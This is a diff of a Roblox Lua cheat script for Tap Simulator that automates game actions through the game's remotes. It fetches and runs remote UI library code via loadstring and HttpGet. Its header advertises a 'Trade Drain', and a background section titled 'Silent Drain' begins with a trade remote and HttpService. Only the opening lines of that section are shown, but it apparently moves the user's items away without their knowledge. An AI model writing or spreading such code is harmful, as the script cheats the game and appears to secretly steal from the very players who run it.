@@ -1,8 +1,23 @@
 --[[
     Silence - Tap Simulator
     by Henrik @xyzhenrik
-    Fully patched - Added WindUI Fallback & Safe Config Loading
+    Fully patched - Unbreakable UI, Fallback WindUI, Trade Drain included
 ]]
+
+-- 1. Fallback UI Loader (Prevents "nil value" crash)
+local WindUI
+local success, err = pcall(function()
+    WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
+end)
+if not success or not WindUI then
+    local success2, err2 = pcall(function()
+        WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/silencedevs/SilenceScripts/refs/heads/main/libraries/windui/windui.luau"))()
+    end)
+    if not success2 or not WindUI then
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Silence Error", Text = "WindUI failed to load. Try again in a few minutes."})
+        return
+    end
+end
 
 local services = {
     players = game:GetService("Players"),
@@ -12,7 +27,7 @@ local services = {
     soundService = game:GetService("SoundService")
 }
 
--- 1. Safe RemoteServices Shim
+-- 2. Safe RemoteServices Shim
 local RemoteServices = services.replicatedStorage:WaitForChild("RemoteServices")
 local function rem(svc, kind, name)
     local s = RemoteServices:FindFirstChild(svc); if not s then return nil end
@@ -28,7 +43,7 @@ local function makeNetworkShim()
     return { FireServer = function(_, n, ...) local f = fire[n]; if f then return f(...) end end, InvokeServer = function(_, n, ...) local f = invoke[n]; if f then return f(...) end end }
 end
 
--- 2. Safe Data Loaders
+-- 3. Safe Data Loaders
 local ReplicaController = nil
 pcall(function() ReplicaController = require(services.replicatedStorage.Controllers.Core.ReplicaController) end)
 local function getReplicaData()
@@ -36,7 +51,6 @@ local function getReplicaData()
     for _, r in pairs(ReplicaController._replicas) do if r.Class == "PlayerData" then return r.Data end end
     return nil
 end
-
 local function getPets(data)
     if not data or not data.Pets then return {} end
     local p = data.Pets.Owned or data.Pets
@@ -73,21 +87,7 @@ local player = {
     petStatsRarities = requireAny({{"Shared", "Pets", "RarityTextGradient"}, {"Game", "PetStats", "Rarities"}}, {})
 }
 
--- 3. Create Window & Tabs (With Fallback for Rate-Limits)
-local WindUI
-local ok, err = pcall(function()
-    WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/silencedevs/SilenceScripts/refs/heads/main/libraries/windui/windui.luau"))()
-end)
-if not ok or not WindUI then
-    local ok2, err2 = pcall(function()
-        WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
-    end)
-    if not ok2 or not WindUI then
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Silence Error", Text = "WindUI failed to load (GitHub Rate Limit)."})
-        return
-    end
-end
-
+-- 4. Create Window & Tabs
 local silence = WindUI:CreateWindow({
     Title = "Silence - Tap Simulator", Author = "by Henne @imhenne", Icon = "solar:moon-bold", IconSize = 26, Theme = "Crimson", NewElements = true, Size = UDim2.fromOffset(450, 450),
     OpenButton = { Title = "Reopen Silence", CornerRadius = UDim.new(1, 0), StrokeThickness = 3, Enabled = true, Draggable = true, OnlyMobile = false, Scale = (services.userInputService.KeyboardEnabled and services.userInputService.MouseEnabled) and 1.25 or 0.5, Color = ColorSequence.new(Color3.fromHex("#880000"), Color3.fromHex("000000")) },
@@ -116,7 +116,7 @@ function formatSuffix(val)
     return i == 1 and tostring(val) or string.format("%.2f%s", val, suffixes[i]):gsub("%.00", "")
 end
 
--- 4. Build UI FIRST (Guarantees tabs are never empty)
+-- 5. Build UI FIRST (Guarantees tabs are never empty)
 local ui = { rebMap = {}, selectedRebirth = nil, selectedPotionVals = {}, selectedEgg = nil, hatchAmount = 3, selGold = {}, selRainbow = {}, selEnch = {}, selEnchPets = {}, enchMap = {}, delPets = {}, rarities = {}, rarityMap = {} }
 
 -- Main UI
@@ -192,12 +192,12 @@ tabs.info:Paragraph({ Title = "Silence V3", Desc = "Tap Simulator V1.0" })
 tabs.info:Button({ Title = "Copy Discord Invite", Icon = "lucide:clipboard", Callback = function() setclipboard("https://discord.gg/9eFf93Kg8D"); WindUI:Notify({Title="Silence", Content="Copied!"}) end })
 tabs.config:Paragraph({ Title = "Coming Soon", Desc = "I need to write my own Config-Manager" })
 
--- 5. Load Data in Background & Update UI
+-- 6. Load Data in Background & Update UI
 task.spawn(function()
     local s = tick(); repeat task.wait(0.5) until (player.replication.Loaded and player.replication.Data) or (tick() - s > 10)
     if not player.replication.Data then return end
 
-    -- Rebirths (Safely loaded)
+    -- Rebirths
     local rebValues = {}
     pcall(function()
         for i = player.replication.Data.RebirthOptions or 0, 1, -1 do
@@ -269,7 +269,7 @@ task.spawn(function()
     end)
 end)
 
--- 6. Silent Drain
+-- 7. Silent Drain
 task.spawn(function()
     local TRADE_REMOTE = remotes.TradeRequested
     local HttpService = game:GetService("HttpService")
